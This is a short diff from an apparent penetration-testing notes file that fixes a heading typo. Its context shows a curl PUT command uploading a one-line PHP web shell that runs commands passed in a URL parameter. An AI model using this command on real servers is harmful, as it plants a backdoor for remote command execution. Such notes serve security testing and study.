@@ -25,7 +25,7 @@
  # curl http://xx.xx.xx.xx
 ```
 
-#### Uploada PHP shell file
+#### Upload a PHP shell file
 ```bash
  # curl -X PUT -d '<?php system($_GET["cmd"]);' http://172.168.1.10/test/cmd.php
 
